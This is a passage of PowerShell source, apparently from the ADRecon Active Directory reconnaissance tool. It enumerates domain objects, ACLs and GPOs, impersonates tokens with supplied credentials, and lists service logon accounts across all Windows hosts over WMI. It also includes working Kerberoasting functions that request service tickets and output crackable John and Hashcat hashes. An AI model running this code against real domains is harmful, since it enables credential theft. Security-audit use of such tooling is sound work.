                $GUIDs[(New-Object Guid (,$_.rightsGUID)).Guid] = $_.name
            }
            Remove-Variable schemaIDs
        }


        $Objs = @()
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        Try
        {
            Write-Verbose "[*] Enumerating Domain, OU, GPO, User, Computer and Group Objects"
            $Objs += Get-ADObject -LDAPFilter '(|(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))' -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }

        If ($ADDomain)
        {
            Try
            {
                Write-Verbose "[*] Enumerating Root Container Objects"
                $Objs += Get-ADObject -SearchBase $($ADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter '(objectClass=container)' -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error while enumerating Root Container Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }

        If ($Objs)
        {
            $ACLObj = @()
            Write-Verbose "[*] Total Objects: $([ADRecon.ADWSClass]::ObjectCount($Objs))"
            Write-Verbose "[-] DACLs"
            $DACLObj = [ADRecon.ADWSClass]::DACLParser($Objs, $GUIDs, $Threads)

            Write-Warning "[*] SACLs - Currently, the module is only supported with LDAP."

            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}

        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                $SchemaPath = $ADForest.Schema.Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating SchemaPath"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $SchemaPath = $ADForest.Schema.Name
            Remove-Variable ADForest
        }

        If ($SchemaPath)
        {
            Write-Verbose "[*] Enumerating schemaIDs"
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath)")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = "(schemaIDGUID=*)"

            Try
            {
                $SchemaSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating SchemaIDs"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If ($SchemaSearcher)
            {
                $SchemaSearcher | Where-Object {$_} | ForEach-Object {

                    $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]
                }
                $SchemaSearcher.dispose()
            }
            $objSearcherPath.dispose()

            Write-Verbose "[*] Enumerating Active Directory Rights"
            If ($Credential -ne [Management.Automation.PSCredential]::Empty)
            {
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SchemaPath.replace("Schema","Extended-Rights"))", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
            }
            Else
            {
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] "LDAP://$($SchemaPath.replace("Schema","Extended-Rights"))")
            }
            $objSearcherPath.PageSize = $PageSize
            $objSearcherPath.filter = "(objectClass=controlAccessRight)"

            Try
            {
                $RightsSearcher = $objSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRACL] Error enumerating Active Directory Rights"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If ($RightsSearcher)
            {
                $RightsSearcher | Where-Object {$_} | ForEach-Object {

                    $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]
                }
                $RightsSearcher.dispose()
            }
            $objSearcherPath.dispose()
        }


        $Objs = @()
        Write-Verbose "[*] Enumerating Domain, OU, GPO, User, Computer and Group Objects"
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(|(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))"

        $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange(("displayname","distinguishedname","name","ntsecuritydescriptor","objectclass","objectsid"))
        $ObjSearcher.SearchScope = "Subtree"

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        Write-Verbose "[*] Enumerating Root Container Objects"
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(objectClass=container)"

        $ObjSearcher.SecurityMasks = $ObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","name","ntsecuritydescriptor","objectclass"))
        $ObjSearcher.SearchScope = "OneLevel"

        Try
        {
            $Objs += $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRACL] Error while enumerating Root Container Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        $ObjSearcher.dispose()

        If ($Objs)
        {
            Write-Verbose "[*] Total Objects: $([ADRecon.LDAPClass]::ObjectCount($Objs))"
            Write-Verbose "[-] DACLs"
            $DACLObj = [ADRecon.LDAPClass]::DACLParser($Objs, $GUIDs, $Threads)
            Write-Verbose "[-] SACLs - May need a Privileged Account"
            $SACLObj = [ADRecon.LDAPClass]::SACLParser($Objs, $GUIDs, $Threads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If ($DACLObj)
    {
        Export-ADR $DACLObj $ADROutputDir $OutputType "DACLs"
        Remove-Variable DACLObj
    }

    If ($SACLObj)
    {
        Export-ADR $SACLObj $ADROutputDir $OutputType "SACLs"
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [bool] $UseAltCreds,

        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {

            $SaveVerbosePreference = $script:VerbosePreference
            $script:VerbosePreference = 'SilentlyContinue'
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop | Out-Null
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning "[Get-ADRGPOReport] Error importing the GroupPolicy Module. Skipping GPOReport"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            If ($SaveVerbosePreference)
            {
                $script:VerbosePreference = $SaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return $null
        }
        Try
        {
            Write-Verbose "[*] GPOReport XML"
            $ADFileName = -join($ADROutputDir,'\','GPO-Report','.xml')
            Get-GPOReport -All -ReportType XML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning "[*] Run the tool using RUNAS."
                Write-Warning "[*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe"
                Return $null
            }
            Write-Warning "[Get-ADRGPOReport] Error getting the GPOReport in XML"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
        Try
        {
            Write-Verbose "[*] GPOReport HTML"
            $ADFileName = -join($ADROutputDir,'\','GPO-Report','.html')
            Get-GPOReport -All -ReportType HTML -Path $ADFileName
        }
        Catch
        {
            If ($UseAltCreds)
            {
                Write-Warning "[*] Run the tool using RUNAS."
                Write-Warning "[*] runas /user:<Domain FQDN>\<Username> /netonly powershell.exe"
                Return $null
            }
            Write-Warning "[Get-ADRGPOReport] Error getting the GPOReport in XML"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
        }
    }
    If ($Protocol -eq 'LDAP')
    {
        Write-Warning "[*] Currently, the module is only supported with ADWS."
    }
}


Function Get-ADRUserImpersonation
{


    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = 'Credential')]
    Param(
        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential,

        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle,

        [Switch]
        $Quiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet']))
    {
        Write-Warning "[Get-ADRUserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
    }

    If ($PSBoundParameters['TokenHandle'])
    {
        $LogonTokenHandle = $TokenHandle
    }
    Else
    {
        $LogonTokenHandle = [IntPtr]::Zero
        $NetworkCredential = $Credential.GetNetworkCredential()
        $UserDomain = $NetworkCredential.Domain
        If (-Not $UserDomain)
        {
            Write-Warning "[Get-ADRUserImpersonation] Use credential with Domain FQDN. (<Domain FQDN>\<Username>)"
        }
        $UserName = $NetworkCredential.UserName
        Write-Warning "[Get-ADRUserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"



        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle)
        $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not $Result)
        {
            throw "[Get-ADRUserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
        }
    }


    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    If (-not $Result)
    {
        throw "[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Get-ADR-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}


Function Get-ADRRevertToSelf
{


    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    If ($PSBoundParameters['TokenHandle'])
    {
        Write-Warning "[Get-ADRRevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf()
    $LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not $Result)
    {
        Write-Error "[Get-ADRRevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Get-ADRRevertToSelf] Token impersonation successfully reverted"
}


Function Get-ADRSPNTicket
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $UserSPN
    )

    Try
    {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
        $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
    }
    Catch
    {
        Write-Warning "[Get-ADRSPNTicket] Error requesting ticket for SPN $UserSPN"
        Write-Warning "[EXCEPTION] $($_.Exception.Message)"
        Return $null
    }

    If ($Ticket)
    {
        $TicketByteStream = $Ticket.GetRequest()
    }

    If ($TicketByteStream)
    {
        $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'



        If ($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)')
        {
            $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
            $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
            $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)


            If ($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482')
            {
                Write-Warning '[Get-ADRSPNTicket] Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName).' # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
                $Hash = $null
            }
            Else
            {
                $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
            }
        }
        Else
        {
            Write-Warning "[Get-ADRSPNTicket] Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName)." # Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq
            $Hash = $null
        }
    }
    $Obj = New-Object PSObject
    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $Ticket.ServicePrincipalName
    $Obj | Add-Member -MemberType NoteProperty -Name "Etype" -Value $Etype
    $Obj | Add-Member -MemberType NoteProperty -Name "Hash" -Value $Hash
    Return $Obj
}

Function Get-ADRKerberoast
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize
    )

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $LogonToken = Get-ADRUserImpersonation -Credential $Credential
    }

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADUsers = Get-ADObject -LDAPFilter "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties sAMAccountName,servicePrincipalName,DistinguishedName -ResultPageSize $PageSize
        }
        Catch
        {
            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.servicePrincipalName)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.sAMAccountName
                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.DistinguishedName.SubString($_.DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"

                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.SamAccountName)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        $ObjSearcher.PropertiesToLoad.AddRange(("distinguishedname","samaccountname","serviceprincipalname","useraccountcontrol"))
        $ObjSearcher.SearchScope = "Subtree"
        Try
        {
            $ADUsers = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning "[Get-ADRKerberoast] Error while enumerating UserSPN Objects"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADUsers)
        {
            $UserSPNObj = @()
            $ADUsers | ForEach-Object {
                ForEach ($UserSPN in $_.Properties.serviceprincipalname)
                {
                    $Obj = New-Object PSObject
                    $Obj | Add-Member -MemberType NoteProperty -Name "Username" -Value $_.Properties.samaccountname[0]
                    $Obj | Add-Member -MemberType NoteProperty -Name "ServicePrincipalName" -Value $UserSPN

                    $HashObj = Get-ADRSPNTicket $UserSPN
                    If ($HashObj)
                    {
                        $UserDomain = $_.Properties.distinguishedname[0].SubString($_.Properties.distinguishedname[0].IndexOf('DC=')) -replace 'DC=','' -replace ',','.'

                        $JTRHash = "`$krb5tgs`$$($HashObj.ServicePrincipalName):$($HashObj.Hash)"

                        $HashcatHash = "`$krb5tgs`$$($HashObj.Etype)`$*$($_.Properties.samaccountname)`$$UserDomain`$$($HashObj.ServicePrincipalName)*`$$($HashObj.Hash)"
                    }
                    Else
                    {
                        $JTRHash = $null
                        $HashcatHash = $null
                    }
                    $Obj | Add-Member -MemberType NoteProperty -Name "John" -Value $JTRHash
                    $Obj | Add-Member -MemberType NoteProperty -Name "Hashcat" -Value $HashcatHash
                    $UserSPNObj += $Obj
                }
            }
            Remove-Variable ADUsers
        }
    }

    If ($LogonToken)
    {
        Get-ADRRevertToSelf -TokenHandle $LogonToken
    }

    If ($UserSPNObj)
    {
        Return $UserSPNObj
    }
    Else
    {
        Return $null
    }
}


Function Get-ADRDomainAccountsusedforServiceLogon
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [int] $PageSize,

        [Parameter(Mandatory = $false)]
        [int] $Threads = 10
    )

    BEGIN {
        $readServiceAccounts = [scriptblock] {

            $hostname = [string] $args[0]
            $OperatingSystem = [string] $args[1]

            $Credential = $args[2]
            $timeout = 250
            $port = 135
            Try
            {
                $tcpclient = New-Object System.Net.Sockets.TcpClient
                $result = $tcpclient.BeginConnect($hostname,$port,$null,$null)
                $success = $result.AsyncWaitHandle.WaitOne($timeout,$null)
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) is unreachable $($_.Exception.Message)"
                $success = $false
                $tcpclient.Close()
            }
            If ($success)
            {

                If ($PSVersionTable.PSVersion.Major -ne 2)
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption –Protocol DCOM) -Credential $Credential
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop)
                        }
                    }
                    Else
                    {
                        $session = New-CimSession -ComputerName $hostname -SessionOption $(New-CimSessionOption –Protocol DCOM)
                        If ($session)
                        {
                            $serviceList = @( Get-CimInstance -ClassName Win32_Service -Property Name,StartName,SystemName -CimSession $session -ErrorAction Stop )
                        }
                    }
                }
                Else
                {
                    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Credential $Credential -Impersonation 3 -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                    Else
                    {
                        $serviceList = @( Get-WmiObject -Class Win32_Service -ComputerName $hostname -Property Name,StartName,SystemName -ErrorAction Stop )
                    }
                }
                $serviceList
            }
            Try
            {
                If ($tcpclient) { $tcpclient.EndConnect($result) | Out-Null }
            }
            Catch
            {
                $warning = "$hostname ($OperatingSystem) : $($_.Exception.Message)"
            }
            $warning
        }

        Function processCompletedJobs()
        {



            $jobs = Get-Job -State Completed
            ForEach( $job in $jobs )
            {
                If ($null -ne $job)
                {
                    $data = Receive-Job $job
                    Remove-Job $job
                }

                If ($data)
                {
                    If ( $data.GetType() -eq [Object[]] )
                    {
                        $serviceList = $data | Where-Object { if ($_.StartName) { $_ }}
                        $serviceList | ForEach-Object {
                            $Obj = New-Object PSObject
                            $Obj | Add-Member -MemberType NoteProperty -Name "Account" -Value $_.StartName
                            $Obj | Add-Member -MemberType NoteProperty -Name "Service Name" -Value $_.Name
                            $Obj | Add-Member -MemberType NoteProperty -Name "SystemName" -Value $_.SystemName
                            If ($_.StartName.toUpper().Contains($currentDomain))
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name "Running as Domain User" -Value $true
                            }
                            Else
                            {
                                $Obj | Add-Member -MemberType NoteProperty -Name "Running as Domain User" -Value $false
                            }
                            $script:serviceAccounts += $Obj
                        }
                    }
                    ElseIf ( $data.GetType() -eq [String] )
                    {
                        $script:warnings += $data
                        Write-Verbose $data
                    }
                }
            }
        }
    }

    PROCESS
    {
        $script:serviceAccounts = @()
        [string[]] $warnings = @()
        If ($Protocol -eq 'ADWS')
        {
            Try
            {
                $ADDomain = Get-ADDomain
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            If ($ADDomain)
            {
                $currentDomain = $ADDomain.NetBIOSName.toUpper()
                Remove-Variable ADDomain
            }
            Else
            {
                $currentDomain = ""
                Write-Warning "Current Domain could not be retrieved."
            }

            Try
            {
                $ADComputers = Get-ADComputer -Filter { Enabled -eq $true -and OperatingSystem -Like "*Windows*" } -Properties Name,DNSHostName,OperatingSystem
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }

            If ($ADComputers)
            {


                $cnt = $([ADRecon.ADWSClass]::ObjectCount($ADComputers))
                Write-Verbose "[*] Total Windows Hosts: $cnt"
                $icnt = 0
                $ADComputers | ForEach-Object {
                    $StopWatch = [System.Diagnostics.StopWatch]::StartNew()
                    If( $_.dnshostname )
	                {
                        $args = @($_.DNSHostName, $_.OperatingSystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
                            Write-Progress -Activity "Retrieving data from servers" -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
                        while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }



                Write-Progress -Activity "Retrieving data from servers" -Status "Waiting for background jobs to complete..." -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity "Retrieving data from servers" -Completed -Status "All Done"
            }
        }

        If ($Protocol -eq 'LDAP')
        {
            $currentDomain = ([string]($objDomain.name)).toUpper()

            $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
            $ObjSearcher.PageSize = $PageSize
            $ObjSearcher.Filter = "(&(samAccountType=805306369)(!userAccountControl:1.2.840.113556.1.4.803:=2)(operatingSystem=*Windows*))"
            $ObjSearcher.PropertiesToLoad.AddRange(("name","dnshostname","operatingsystem"))
            $ObjSearcher.SearchScope = "Subtree"

            Try
            {
                $ADComputers = $ObjSearcher.FindAll()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomainAccountsusedforServiceLogon] Error while enumerating Windows Computer Objects"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            $ObjSearcher.dispose()

            If ($ADComputers)
            {


                $cnt = $([ADRecon.LDAPClass]::ObjectCount($ADComputers))
                Write-Verbose "[*] Total Windows Hosts: $cnt"
                $icnt = 0
                $ADComputers | ForEach-Object {
                    If( $_.Properties.dnshostname )
	                {
                        $args = @($_.Properties.dnshostname, $_.Properties.operatingsystem, $Credential)
		                Start-Job -ScriptBlock $readServiceAccounts -Name "read_$($_.Properties.name)" -ArgumentList $args | Out-Null
		                ++$icnt
		                If ($StopWatch.Elapsed.TotalMilliseconds -ge 1000)
                        {
		                    Write-Progress -Activity "Retrieving data from servers" -Status "$("{0:N2}" -f (($icnt/$cnt*100),2)) % Complete:" -PercentComplete 100
                            $StopWatch.Reset()
                            $StopWatch.Start()
		                }
		                while ( ( Get-Job -State Running).count -ge $Threads ) { Start-Sleep -Seconds 3 }
		                processCompletedJobs
	                }
                }


                Write-Progress -Activity "Retrieving data from servers" -Status "Waiting for background jobs to complete..." -PercentComplete 100
                Wait-Job -State Running -Timeout 30  | Out-Null
                Get-Job -State Running | Stop-Job
                processCompletedJobs
                Write-Progress -Activity "Retrieving data from servers" -Completed -Status "All Done"
            }
        }

        If ($script:serviceAccounts)
        {
            Return $script:serviceAccounts
        }
        Else
        {
            Return $null
        }
    }
}

Function Remove-EmptyADROutputDir
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $true)]
        [array] $OutputType
    )

    Switch ($OutputType)
    {
        'CSV'
        {
            $CSVPath  = -join($ADROutputDir,'\','CSV-Files')
            If (!(Test-Path -Path $CSVPath\*))
            {
                Write-Verbose "Removed Empty Directory $CSVPath"
                Remove-Item $CSVPath
            }
        }
        'XML'
        {
            $XMLPath  = -join($ADROutputDir,'\','XML-Files')
            If (!(Test-Path -Path $XMLPath\*))
            {
                Write-Verbose "Removed Empty Directory $XMLPath"
                Remove-Item $XMLPath
            }
        }
        'JSON'
        {
            $JSONPath  = -join($ADROutputDir,'\','JSON-Files')
            If (!(Test-Path -Path $JSONPath\*))
            {
                Write-Verbose "Removed Empty Directory $JSONPath"
                Remove-Item $JSONPath
            }
        }
        'HTML'
        {
            $HTMLPath  = -join($ADROutputDir)
            If (!(Test-Path -Path $HTMLPath\*))
            {
                Write-Verbose "Removed Empty Directory $HTMLPath"
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path $ADROutputDir\*))
    {
        Remove-Item $ADROutputDir
        Write-Verbose "Removed Empty Directory $ADROutputDir"
    }
}

Function Get-ADRAbout
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $true)]
        [DateTime] $date,

        [Parameter(Mandatory = $true)]
        [string] $ADReconVersion,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [string] $RanonComputer,

        [Parameter(Mandatory = $true)]
        [string] $TotalTime
    )

    $AboutThisScan = @()

    If ($Protocol -eq 'ADWS')
    {
        $Version = "RSAT Version"
    }
    Else
    {
        $Version = "LDAP Version"
    }

    If ($Credential -ne [Management.Automation.PSCredential]::Empty)
    {
        $Username = $($Credential.UserName)
    }
    Else
    {
        $Username = $([Environment]::UserName)
    }

    $ObjValues = @("Date", $($date), "Ran as user", $Username, "Ran on computer", $RanonComputer, "Execution Time (mins)", $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues.Count); $i++)
    {
        $Obj = New-Object PSObject
        $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
        $i++
        $AboutThisScan += $Obj
    }
    Return $AboutThisScan
}

Function Outvoke-ADRecon
{

    param(
        [Parameter(Mandatory = $false)]
        [string] $GenExcel,

        [Parameter(Mandatory = $false)]
        [ValidateSet('ADWS', 'LDAP')]
        [string] $Protocol = 'ADWS',

        [Parameter(Mandatory = $true)]
        [array] $Collect,

        [Parameter(Mandatory = $false)]
        [string] $DomainController = '',

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $true)]
        [array] $OutputType,

        [Parameter(Mandatory = $false)]
        [string] $ADROutputDir,

        [Parameter(Mandatory = $false)]
        [int] $DormantTimeSpan = 90,

